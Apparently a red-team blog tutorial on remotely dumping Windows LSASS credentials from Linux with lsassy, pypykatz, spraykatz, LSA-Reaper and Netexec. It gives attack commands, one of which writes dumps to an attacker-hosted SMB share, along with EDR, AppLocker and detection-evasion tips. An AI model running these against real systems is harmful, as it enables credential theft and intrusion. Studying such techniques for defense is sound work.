---
title: "Dumping LSASS Remotely From Linux"
date: 2023-12-22T01:00:01+02:00
tags:
  - active-directory
  - windows
showdate: true
toc: true
---

There are a lot of ways to create a dump of lsass.exe to harvest credentials, but what if we wanted to do it from the comfort of our Linux machine? Here are a few tools that let us do just that.

---

## Lsassy

By far the better and most complete tool for remote LSASS dumping: Hackndo's [lsassy](https://github.com/Hackndo/lsassy) supports quite a few different execution and dumping methods. By default the [comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/) method is used to create the dump without the need of uploading any external tools, this is done through WMI code execution, the method utilized by impacket's wmiexec.

However if we desire Lsassy can be instructed to use different LSASS dumping techniques, specified with the `-m` option. Here are just a few of them:
- upload and execute Sysinternals procdump.exe
- upload and execute [dumpert.exe](https://github.com/outflanknl/Dumpert) to use syscalls
- upload and execute [PPLDump](https://github.com/itm4n/PPLdump) to bypass RunAsPPL (LSA protection)
- upload and execute [MirrorDump](https://github.com/CCob/MirrorDump) to extract LSASS from a custom SSP
- upload and execute [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast) to bypass EDR, RunAsPPL, and [CredentialGuard](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)


![e48236792fdba5b41cbe16456cd5b0b7.png](/_resources/e48236792fdba5b41cbe16456cd5b0b7.png)

Many of the alternative dumping methods involve uploading and executing another binary on the host, like nanodump.exe, mirrordump.exe, dumpert.exe and more. If we wish to use one of these we can specify the binary and its path in the module options with `-O`

![901a664a58d2f67a41b6fab4023a8666.png](/_resources/901a664a58d2f67a41b6fab4023a8666.png)

Or alternatively use the embedded version of the module if it exists, for example procdump nanodump and mirrordump all have an embedded module as well as the normal one, the embedded modules include a base64-encoded version of the binary in the module source code:

![26a963d6afe9568d71029d27bfd4c168.png](/_resources/26a963d6afe9568d71029d27bfd4c168.png)

An interesting feature of Lsassy is being able to decide which execution method to adopt, by default WMI is used but we can also choose between scheduled tasks, [MMC DCOM](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), SMB and "stealthy" SMB. SMB is basically the method utilized by psexec, it uses RPC to create and launch a service pointing to the executable we wish to run, which means by default the program is run as SYSTEM.

The stealthier SMB method works the same way but instead of registering a new service it alters the binPath of a pre-existing service, this way security solutions monitoring for suspicious service creations can be circumvented. The service's original path is later restored.

![b807b5de4784a2a24832031911a40e94.png](/_resources/b807b5de4784a2a24832031911a40e94.png)

Lastly, Lsassy can work over ntlmrelayx's SOCKS tunnels too, just make sure you specify the exact same domain name shown by ntlmrelayx or it won't match the connection properly:

![000aa26942109c525402611fcfe99374.png](/_resources/000aa26942109c525402611fcfe99374.png)

---

## Pypykatz

[Pypykatz](https://github.com/skelsec/pypykatz) is a Python implementation of some Mimikatz features. While it is capable of extracting credentials from the live memory of a local host it is also the tool used by pretty much every program listed here to parse and output the gathered credentials: for this reason it can be the perfect choice if you have already made a dump by living-off-the-land and would like to analyze it from your own Linux box, in which case we would use:
```text
pypykatz lsa minidump <file.dmp>
```

Pypykatz will then proceed to list every secret stored in the dump file divided by user session:

![c6f21687fef04d47a69fbd5c8731f5a2.png](/_resources/c6f21687fef04d47a69fbd5c8731f5a2.png)

This produces a very long and hard to read output though, so I prefer adding `-g` to produce an easily "greppable" output and maybe even `-p` to only show the authentication packages I'm interested in, like MSV for NT hashes or WDigest for clear text passwords:

![407f4471b5a3b41370b1465254ed079d.png](/_resources/407f4471b5a3b41370b1465254ed079d.png)

All the supported values for `-p` are: all (default), msv, wdigest, tspkg, ssp, livessp, dpapi, cloudap, kerberos.

As a little extra, if we want to dump LSASS remotely from Windows Pypykatz can do that through SMB:
```text
pypykatz live smb lsassdump <host>
```

live commands only work on Windows though and this post is about Linux tools, so I'll move on.

---

## Spraykatz

[Spraykatz](https://github.com/aas-n/spraykatz) was designed to perform remote LSASS dumping on a series of targets at once: it uploads and executes procdump.exe through WMI, then parses the dump remotely so that the file itself isn't read and transmitted over the wire all at once. Instead, it will read it in chunks to try and avoid detection:

![26c6a3ec584014cc665107a9318281e2.png](/_resources/26c6a3ec584014cc665107a9318281e2.png)

As usual Pypykatz is used to parse the dump and show us the credentials. Launching it on a machine with local credentials would look like this:
```text
python3 spraykatz.py -u administrator -p 'MegaPassword!1' -t 192.168.0.144 -d .
```

![23a10b58978c2a5646a3de49c2f19788.png](/_resources/23a10b58978c2a5646a3de49c2f19788.png)

If we are interested in launching it against multiple hosts we can specify the target as the name of a file containing one target per line, or either a series of hosts separated by commas as well as an IP range in CIDR notation from the command line.

Spraykatz automatically tries to remove procdump and any dump files, but launching it with `-r` afterwards makes sure we aren't leaving anything behind.

---

## LSA-Reaper

[LSA-Reaper](https://github.com/samiam1086/LSA-Reaper) is an interesting tool that goes for a slightly different approach than the others, focusing on using the `MiniDumpWriteDump` function found in Dbghelp.dll, providing a number of different ways to use it.

The payload is essentially just a call to `MiniDumpWriteDump` but instead of writing the dump on the host's disk it first mounts a network drive linking to the attacker's machine, which is then used as destination folder for the function. This should help bypass some AVs that monitor disk write operations.

The most basic usage provides the target, its credentials, and the local IP address to launch the SMB server:
```text
sudo python3 lsa-reaper.py -ip 192.168.0.207 administrator:'MegaPassword!1'@192.168.0.105
```

![d97ad0f73f3c5a48f37a90772ac0390d.png](/_resources/d97ad0f73f3c5a48f37a90772ac0390d.png)

Within a few seconds LSA-Reaper will have mounted the network drive, copied and executed the payload on the host, and unmounted the drive:

![8d4e63a6cd27ca568b22e93cec9096f2.png](/_resources/8d4e63a6cd27ca568b22e93cec9096f2.png)

If execution was successful we should have a `loot` folder with the dump waiting for us, which we can read with Pypykatz:

![511a47c5f9298c3ebd1f0d2c40937ede.png](/_resources/511a47c5f9298c3ebd1f0d2c40937ede.png)

LSA-Reaper has quite a few useful options, firstly we can tell it to do the dump parsing automatically with `-ap`, this will create three text files with the found credentials, one with all credentials, another with full output in greppable format and a third with the NT hashes :

![dcaa826cc7bc2c4d8f9e30ef14a033b6.png](/_resources/dcaa826cc7bc2c4d8f9e30ef14a033b6.png)

Another interesting thing about LSA-Reaper is that it supports quite a few different payloads, we can simply drop the custom .exe or have an application call our payload in DLL form with DLL sideloading, for example by renaming the payload in WindowsCodecs.dll and having a copy of calc.exe in the same folder:

![d16ac7aa0a188bd1ec7ce704591c0e16.png](/_resources/d16ac7aa0a188bd1ec7ce704591c0e16.png)

There can be two versions of the same payload:  mdwd (`MiniDumpWriteDump`) and mdwdpss (`MiniDumpWriteDump` + `PssCaptureSnapshot`), so for example if we want to run the DLL payload with regsvr32 the two available payloads are `regsvr32-mdwd` and `regsvr32-mdwdpss`.

PssCaptureSnapshot is a Windows API function used to take a snapshot of a process. The reason this is useful is that by creating a snapshot of lsass.exe we obtain a handle that can be given to MiniDumpWriteDump without pointing it to the actual lsass.exe, which would be a major red flag.

Yet another useful payload is `msbuild`, a Microsoft-signed .NET binary shipping with Windows which can be used to compile and execute .NET code from an XML file: this is a good way to [bypass AppLocker](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/#awl%20bypass)'s application whitelisting

LSA-Reaper has a `-relayx` option to automatically exploit an existing socks tunnel established by ntlmrelayx but I was not able to get it to work, when using it Reaper doesn't recognize the target as a parameter anymore. We can still use it dump LSASS from a relay though, we'll just have to do it manually by executing the payload from a shell. First launch ntlmrelayx with `-socks` and make sure you have an admin session:

![d2c2603bbccb5ea7a8b29987ac62f43a.png](/_resources/d2c2603bbccb5ea7a8b29987ac62f43a.png)

Then launch Reaper with the `-oe` option to make it pause before executing the payload, don't even specify a target:

![216849f0abce914ddf002b5a133859cf.png](/_resources/216849f0abce914ddf002b5a133859cf.png)

Next use the relay to connect to the target using a tool like smbexec and start running one at a time the commands printed by Reaper, running the whole line at once will terminate the connection when using smbexec (smbexec-modified.py comes in the LSA-Reaper repo, it should work better over a relay and fix [this issue](https://github.com/fortra/impacket/issues/777) for Windows Server 2019, use that if targeting this specific OS):

![de72aeda975d1c8e9122657d55886427.png](/_resources/de72aeda975d1c8e9122657d55886427.png)

After the network drive has been unmounted press enter on Reaper and the parsing will begin, once it's done you'll find the output in the loot folder as usual:

![60bbcfe22d900425618cceeeabfb491f.png](/_resources/60bbcfe22d900425618cceeeabfb491f.png)

---

## Netexec / Crackmapexec

[Netexec](https://github.com/Pennyw0rth/NetExec) is the new version of the old CME, which is now no longer supported. Netexec comes with a lot of modules that can execute other programs, including LSASS dumping utilities. While it is useful being able to call all these programs from a single application that doesn't require the separate installation of each, as we'll see there are a couple reasons why you may rather use the original standalone programs.

**Lsassy**

If for some reason we don't want to or can't install the standalone lsassy we can still use its Netexec module. The main difference is that this module does not implement the majority of Lsassy's options. We can still choose which dumping method to use if we pass the `METHOD` argument to the module, but that's all the control we get:

![13e4f30a5cecb6ef3275529e516f223c.png](/_resources/13e4f30a5cecb6ef3275529e516f223c.png)

If we don't specify a method comsvcs.dll is used, like most Netexec modules this one doesn't need other information besides credentials to work:

![91780731b02e0f42531e9d54767bea70.png](/_resources/91780731b02e0f42531e9d54767bea70.png)

Basically it's just a stripped down version of Lsassy. I wasn't able to get it to work over a relay either, I'd say use the actual program.

**Nanodump**

[Nanodump](https://github.com/fortra/nanodump) is a program that supports quite a few different methods of creating a dump of the LSASS process, this way it can circumvent some security solutions that may be looking only for the most common function calls associated with LSASS dumping attempts. The GitHub page lists every supported method and it is worth giving it a look to see just how many possibilities there are, different methods can even be combined with Nanodump.

All this module does is upload a copy of the binary on the system with SMB, find the lsass.exe PID, and launch Nanodump with the default settings:

![b133d03a9466e6acd02f43f6dea9749d.png](/_resources/b133d03a9466e6acd02f43f6dea9749d.png)

The only settings available are for using a different copy of nano.exe or changing where the program and dump file will be created on the target, we can't specify a preferred technique:

![f45706fc533d6461801e1270cb95cff0.png](/_resources/f45706fc533d6461801e1270cb95cff0.png)

If we really insist on wanting to use Nanodump from Netexec but also want to use a specific method we can still modify the module source code, which I simply found by running `locate nanodump`:

![5c819ae697443e9f944a8c2215cdc803.png](/_resources/5c819ae697443e9f944a8c2215cdc803.png)

**Procdump**

As the name implies this module works the same way Spraykatz does: it uploads and executes a copy of Sysinternals procdump on the host to use a trusted and signed executable to create the dump. Unfortunately this module does not seem to work out of the box, not in my environment at least:

![831401c554616e77f0b63e6d6ec60de7.png](/_resources/831401c554616e77f0b63e6d6ec60de7.png)

The binary is downloaded on the machine but running it manually shows that the program is crashing when attempting to do the dump:

![5fec7c32b264c4b2ed9af8108ea075f9.png](/_resources/5fec7c32b264c4b2ed9af8108ea075f9.png)

A freshly downloaded copy of procdump64 from Microsoft's website on the other hand works just fine:

![c3e56290af29f48b012add9dd485207f.png](/_resources/c3e56290af29f48b012add9dd485207f.png)

So the problem stems from the executable embedded in the module, I tried it on three different VMs with different Windows versions, it did not work on a single one. To fix this we can tell the module to load a different copy of procdump with the `PROCDUMP_PATH` and `PROCDUMP_EXE_NAME` parameters: 

![6ee856f0eba1348d7de2b394de7c167e.png](/_resources/6ee856f0eba1348d7de2b394de7c167e.png)

That way the command becomes:
```text
netexec smb 192.168.0.100 -u administrator -p 'MegaPassword!1' -M procdump -o PROCDUMP_PATH=~/tools/
```

But that is still not enough as I received another error, this time from Pypykatz:

![ac562c48e8397f4a4fff282e542b0813.png](/_resources/ac562c48e8397f4a4fff282e542b0813.png)

Well the good news is procdump worked perfectly and netexec copied the dump in /tmp with a name like `<HOST>-AMD64-<DOMAIN>.dmp`, and giving it to Pypykayz by hand finally works:

![5746c944079589d6e269bc57a8d12df4.png](/_resources/5746c944079589d6e269bc57a8d12df4.png)

Moral of the story: don't use this module.

**Handlekatz**

This is another module that at least for me never works out of the box:

![8609d78adbbc18c427a00f57b86406d2.png](/_resources/8609d78adbbc18c427a00f57b86406d2.png)

[Handlekatz](https://github.com/codewhitesec/HandleKatz) is supposed to create an LSASS dump through a duplicated process handle, but unlike the procdump method I was not able to get this module to work by replacing the executable. So, know that this exists, but if you're interested in experimenting with Handlekatz do not rely on the netexec module.

These are all the modules Netexec currently ships with that support dumping LSASS. When using any one of these keep in mind that the original Windows binaries, their stdout and the dumps they generate are stored in `C:\Windows\Temp` and NOT deleted automatically, so make sure you clean up after yourself.

At the end of the day I prefer using Lasssy, the other programs can be useful for specific scenarios but offer less functionality.

---

**References**
- https://en.hackndo.com/remote-lsass-dump-passwords/
- https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools/
- https://abrictosecurity.com/extract-dump-lsass-remotely/
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass


